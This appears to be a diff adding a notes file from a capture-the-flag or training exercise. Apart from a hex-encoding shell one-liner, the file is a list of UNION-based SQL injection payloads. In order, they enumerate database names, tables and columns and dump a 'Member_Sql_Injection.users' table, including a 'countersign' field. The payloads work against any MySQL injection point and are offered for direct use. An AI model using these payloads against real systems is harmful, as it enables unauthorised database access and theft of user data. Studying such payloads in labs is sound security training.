@@ -1,0 +1,28 @@
+### Useful commands ###
+
+> String to hexadecimal :
+echo -n " " | od -A n -t x1 | tr -d '[:space:]'
+
+
+### Payloads ###
+
+> Payload leaking databases :
+1 UNION SELECT 2,(SELECT group_concat(schema_name) from information_schema.schemata) -- -
+
+
+> Payload leaking tables from Member_Sql_Injection database :
+1 UNION SELECT 2,(SELECT group_concat(table_name) from information_schema.tables where table_schema IN (0x4d656d6265725f53716c5f496e6a656374696f6e)) -- -
+
+
+> Payload leaking columns for tables in Member_Sql_Injection database :
+1 UNION SELECT 2,(SELECT group_concat(table_name,0x3a,column_name) from information_schema.columns where table_schema IN (0x4d656d6265725f53716c5f496e6a656374696f6e)) -- -
+
+
+> Payload leaking content of Member_Sql_Injection database :
+1 UNION SELECT 2,(SELECT group_concat(user_id,0x3a,first_name,0x3a,last_name,0x3a,town,0x3a,country,0x3a,planet,0x3a,Commentaire,0x3a,countersign) from Member_Sql_Injection.users) -- -
+
+
+> Payload leaking only row 5 of Member_Sql_Injection :
+1 UNION SELECT 2,(SELECT group_concat(user_id,0x3a,first_name,0x3a,last_name,0x3a,town,0x3a,country,0x3a,planet,0x3a,Commentaire,0x3a,countersign) from Member_Sql_Injection.users where user_id = 5) -- -
+
+
